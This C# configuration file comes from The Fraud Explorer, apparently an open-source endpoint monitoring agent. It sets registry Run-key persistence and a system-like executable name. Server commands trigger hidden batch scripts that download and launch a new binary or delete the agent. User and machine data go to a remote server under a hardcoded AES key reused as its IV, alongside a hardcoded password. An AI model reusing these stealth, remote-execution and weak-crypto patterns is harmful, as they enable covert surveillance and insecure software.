/*
 * The Fraud Explorer
 * http://www.thefraudexplorer.com/
 *
 * Copyright (c) 2017 The Fraud Explorer
 * email: support@thefraudexplorer.com
 * Licensed under GNU GPL v3
 * http://www.thefraudexplorer.com/License
 *
 * Date: 2017-04
 * Revision: v0.9.9-beta
 *
 * Description: Internal configuration
 */

using System;
using Microsoft.Win32;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;
using System.Net;
using System.Text;
using System.Reflection;
using System.Collections.Generic;
using System.Security.Cryptography;
using TFE_core.Database;
using TFE_core.Networking;
using TFE_core.Crypto;

namespace TFE_core.Config
{
    class Settings
    {
        /// <summary>
        /// Filesystem variables
        /// </summary>

        #region Filesystem variables

        public static string SoftwareBaseDir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Software";
        public static string SoftwareUpdater = SoftwareBaseDir + "\\Updater";
        public static string AppPath = Common.SetAndCheckDir("InstallationPath") + "\\" + Settings.thefraudexplorer_executableName();

        #endregion

        /// <summary>
        /// Operating system variables
        /// </summary>

        #region Operating system variables

        public static string MainDrive = "C:\\";

        #endregion

        /// <summary>
        /// Configuration variables
        /// </summary>

        #region Configuration variables

        // SQLite filepath

        public static string sqlFile()
        {
            return Common.SetAndCheckDir("InstallationPath") + "\\tfe.db3";
        }

        public const string HEARTBEAT = "heartbeat";
        public const string TAFLAG = "textAnalytics";
        public const string SRFLAG = "mainServer";
        public const string ANFLAG = "analyticsServer";
        public const string AESKEYFLAG = "aesKey";
        public const string AESIVFLAG = "aesIV";
        public const string EXEFLAG = "exeName";
        public const string REGFLAG = "registryKey";
        public const string SRPWDFLAG = "serverPassword";
        public const string HVERFLAG = "harvesterVersion";
        public const string APOSTFIXFLAG = "agentPostfix";
        public const string TPORTFLAG = "textPort";

        // Get machine unique identification

        public static string UNIQUEGUID_VALUE()
        {
            return "_" + GetMachineGUID() + Initialization.parametersFromBinary(APOSTFIXFLAG);
        }

        public const string UNIQUEGUID = "uniqueguid";

        // Encrypt server password

        public static string AppSERVERRegisterKeyPass()
        {
            return Cryptography.EncRijndael(SQLStorage.retrievePar(Settings.SRPWDFLAG));
        }

        #endregion

        /// <summary>
        /// Cryptography variables
        /// </summary>

        #region Cryptography variables

        public static byte[] AppAESkey = Encoding.ASCII.GetBytes(SQLStorage.retrievePar(Settings.AESKEYFLAG));
        public static byte[] AppAESiv = Encoding.ASCII.GetBytes(SQLStorage.retrievePar(Settings.AESIVFLAG));

        #endregion

        /// <summary>
        /// Uninstall and update variables
        /// </summary>

        #region Uninstall and update variables

        public static string Updaterfilename = "\\updater.bat";
        public static string SelfDltFileName = "\\selfdlt.bat";

        #endregion

        /// <summary>
        /// Network variables and methods
        /// </summary>

        #region Network variables and methods

        public static string Domain = "https://" + Network.ExtractDomainFromURL(SQLStorage.retrievePar(Settings.SRFLAG));
        public static string userDomain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
        public static string OnlineCheck = Domain + "/online.html";
        public static string XML = SQLStorage.retrievePar(Settings.SRFLAG);
        public static string AnalyticsServerIP = SQLStorage.retrievePar(Settings.ANFLAG);
        public static string usrSession = Environment.UserName.ToLower().Replace(" ", string.Empty);
        public static string AgentID = usrSession + SQLStorage.retrievePar(UNIQUEGUID);
        public static bool use_proxy = false;
        public static string proxy_url_with_port = "https://localhost:8080";
        public static string proxy_usr = "test";
        public static string proxy_pwd = "test";
        public static string systemVersion = Cryptography.EncRijndael(Common.OSVersion());
        public static string AgentIDEncoded = Cryptography.EncRijndael(Settings.AgentID);
        public static string AppURL = Domain + "/update.php?token=" + System.Net.WebUtility.HtmlEncode(AgentIDEncoded) +
        "&s=" + System.Net.WebUtility.HtmlEncode(systemVersion) + "&v=" + Cryptography.EncRijndael(Settings.thefraudexplorer_version()) + "&k=" + AppSERVERRegisterKeyPass() +
        "&d=" + Cryptography.EncRijndael(Settings.userDomain);

        public static string AppDataURL(String info, string command, string uniqueID, int lastPacket)
        {
            return Domain + "/getMachineDataIn.php?c=" + command +
            "&response=" + System.Net.WebUtility.HtmlEncode(Cryptography.EncRijndael(info)) +
            "&m=" + System.Net.WebUtility.HtmlEncode(Cryptography.EncRijndael(Settings.AgentID)) +
            "&id=" + System.Net.WebUtility.HtmlEncode(Cryptography.EncRijndael(uniqueID)) +
            "&end=" + System.Net.WebUtility.HtmlEncode(lastPacket.ToString());
        }

        #endregion

        /// <summary>
        /// Windows registry variables and methods
        /// </summary>

        #region Windows registry variables and methods

        public static string RegistryKeyValue = SQLStorage.retrievePar(Settings.REGFLAG);
        public static string HKEYLocalMachine = "HKEY_LOCAL_MACHINE";
        public static string HCKURun = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

        #endregion

        /// <summary>
        /// Uninstall procedure
        /// </summary>

        #region Uninstall procedure

        public static void autodestroy(string command, string uniqueID)
        {
            try
            {
                // Registry key deletion

                using (RegistryKey key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    if (key == null) { }
                    else
                    {
                        key.DeleteValue(Initialization.parametersFromBinary("registryKey"));
                    }
                }

                // Self delete the excutable and database

                string App = Common.SetAndCheckDir("InstallationPath") + "\\" + Settings.thefraudexplorer_executableName();
                string Database = sqlFile();

                string batchFile = "@echo off" + Environment.NewLine +
                    ":deleApp" + Environment.NewLine +
                    "attrib -h -r -s " + App + Environment.NewLine +
                    "powershell -command \"& { clc '" + App + "';}\"" + Environment.NewLine +
                    "del \"" + App + "\"" + Environment.NewLine +
                    "if Exist \"" + App + "\" GOTO dele" + Environment.NewLine +
                    ":deleDB" + Environment.NewLine +
                    "powershell -command \"& { clc '" + Database + "';}\"" + Environment.NewLine +
                    "del \"" + Database + "\"" + Environment.NewLine +
                    "if Exist \"" + Database + "\" GOTO deleDB" + Environment.NewLine +
                    "del %0";

                StreamWriter SelfDltFile = new StreamWriter(Common.SetAndCheckDir("InstallationPath") + SelfDltFileName);
                SelfDltFile.Write(batchFile);
                SelfDltFile.Close();

                Process proc = new Process();
                proc.StartInfo.FileName = Common.SetAndCheckDir("InstallationPath") + SelfDltFileName;
                proc.StartInfo.CreateNoWindow = true;
                proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                proc.StartInfo.UseShellExecute = true;
                proc.Start();
                proc.PriorityClass = ProcessPriorityClass.Normal;

                // Inform that the command was received and executed

                Network.SendData("uninstalled!", command, uniqueID, 1);

                Environment.Exit(0);
            }
            catch {};
        }

        #endregion

        /// <summary>
        /// Updater procedure
        /// </summary>

        #region Updater procedure

        public static void Updater(string url, string command, string uniqueID)
        {
            try
            {
                // Download new binary

                string url_for_download = url;

                WebClient client = new WebClient();
                if (use_proxy == true) client.Proxy = Network.SettingProxyWeb();
                client.DownloadFile(url_for_download, Common.SetAndCheckDir("UpdaterFolder") + "\\" + Settings.thefraudexplorer_executableName());

                // Self delete the excutable and copy the new one

                string OldApp = Common.SetAndCheckDir("InstallationPath") + "\\" + Settings.thefraudexplorer_executableName();
                string NewApp = Common.SetAndCheckDir("UpdaterFolder") + "\\" + Settings.thefraudexplorer_executableName();
                string batchFile = "@echo off" + Environment.NewLine +
                    ":deleupdate" + Environment.NewLine +
                    "attrib -h -r -s " + OldApp + Environment.NewLine +
                    "powershell -command \"& { clc '" + OldApp + "';}\"" + Environment.NewLine +
                    "del \"" + OldApp + "\"" + Environment.NewLine +
                    "if %ERRORLEVEL% EQU 0 GOTO cpy" + Environment.NewLine +
                    "if Exist \"" + OldApp + "\" GOTO deleupdate" + Environment.NewLine +
                    ":cpy" + Environment.NewLine +
                    "copy " + NewApp + " " + Common.SetAndCheckDir("InstallationPath") + "\\" + Environment.NewLine +
                    "attrib +h +r +s " + NewApp + Environment.NewLine +
                    "start /d \"" + Common.SetAndCheckDir("InstallationPath") + "\" " + Settings.thefraudexplorer_executableName() + Environment.NewLine +
                    "attrib -h -r -s " + NewApp + Environment.NewLine +
                    "del \"" + NewApp + "\"" + Environment.NewLine +
                    "del %0";

                StreamWriter file = new StreamWriter(Common.SetAndCheckDir("InstallationPath") + Updaterfilename);
                file.Write(batchFile);
                file.Close();

                Process proc = new Process();
                proc.StartInfo.FileName = Common.SetAndCheckDir("InstallationPath") + Updaterfilename;
                proc.StartInfo.CreateNoWindow = true;
                proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                proc.StartInfo.UseShellExecute = true;
                proc.Start();
                proc.PriorityClass = ProcessPriorityClass.Normal;

                // Inform that the command was received

                Network.SendData("upgraded to " + thefraudexplorer_version() + "!", command, uniqueID, 1);

                Environment.Exit(0);
            }
            catch { };
        }

        #endregion

        /// <summary>
        /// Application versioning and references
        /// </summary>

        #region Application versioning and references

        public static string thefraudexplorer_version()
        {
            return Initialization.parametersFromBinary(HVERFLAG);
        }

        // The Fraud Explorer Executable name reference

        public static string thefraudexplorer_executableName()
        {
            return SQLStorage.retrievePar(Settings.EXEFLAG) + ".exe";
        }

        // Get Machine ID for unique identification helper

        public static string GetMachineGUID()
        {
            Guid MachineGuid;
            MachineGuid = Guid.NewGuid();
            return MachineGuid.ToString().ToLower().Substring(0,7);
        }

        #endregion

        /// <summary>
        /// Debug options
        /// </summary>

        #region Debug options

        public static void showMessage(string e)
        {
            MessageBox.Show(e);
        }

        #endregion
    }

    class Initialization
    {
        /// <summary>
        /// Load specific company parameters
        /// </summary

        #region Load external variables from Binary

        public static string parametersFromBinary(string type)
        {  
            if (type == "mainServer") return "https://tfe-console.mydomain.com/update.xml";
            if (type == "analyticsServer") return "192.168.10.10";
            if (type == "textAnalytics") return "1";
            if (type == "heartbeat") return "3500000";
            if (type == "sqlitePassword") return "0x15305236576e366832727a304f6a4731";
            if (type == "exeName") return "msrhl64svc";
            if (type == "aesKey") return "1uBu8ycVugDIJz61";
            if (type == "aesIV") return "1uBu8ycVugDIJz61";
            if (type == "serverPassword") return "KGBz77";
            if (type == "registryKey") return "TFE_64bit";
            if (type == "harvesterVersion") return "0.9.9";
            if (type == "agentPostfix") return "_agt";
            if (type == "textPort") return "5965";
            else return "";
        }

        #endregion
    }

    class DLLEmbed
    {
        /// <summary>
        /// Embed DLL
        /// </summary>

        #region Embed DLL

        static Dictionary<string, Assembly> dic = null;

        public static void Load(string embeddedResource, string fileName)
        {
            if (dic == null) dic = new Dictionary<string, Assembly>();

            byte[] ba = null;
            Assembly asm = null;
            Assembly curAsm = Assembly.GetExecutingAssembly();

            using (Stream stm = curAsm.GetManifestResourceStream(embeddedResource))
            {
                if (stm == null) throw new Exception(embeddedResource + " is not found in Embedded Resources.");
                ba = new byte[(int)stm.Length];
                stm.Read(ba, 0, (int)stm.Length);
                try
                {
                    asm = Assembly.Load(ba);
                    dic.Add(asm.FullName, asm);
                    return;
                }
                catch { }
            }

            bool fileOk = false;
            string tempFile = "";

            using (SHA1CryptoServiceProvider sha1 = new SHA1CryptoServiceProvider())
            {
                string fileHash = BitConverter.ToString(sha1.ComputeHash(ba)).Replace("-", string.Empty);
                tempFile = Path.GetTempPath() + fileName;

                if (File.Exists(tempFile))
                {
                    byte[] bb = File.ReadAllBytes(tempFile);
                    string fileHash2 = BitConverter.ToString(sha1.ComputeHash(bb)).Replace("-", string.Empty);

                    if (fileHash == fileHash2) fileOk = true;
                    else fileOk = false;
                }
                else fileOk = false;
            }
            if (!fileOk) System.IO.File.WriteAllBytes(tempFile, ba);
            asm = Assembly.LoadFile(tempFile);
            dic.Add(asm.FullName, asm);
        }

        public static Assembly Get(string assemblyFullName)
        {
            if (dic == null || dic.Count == 0) return null;
            if (dic.ContainsKey(assemblyFullName)) return dic[assemblyFullName];
            return null;
        }

        #endregion
    }
}
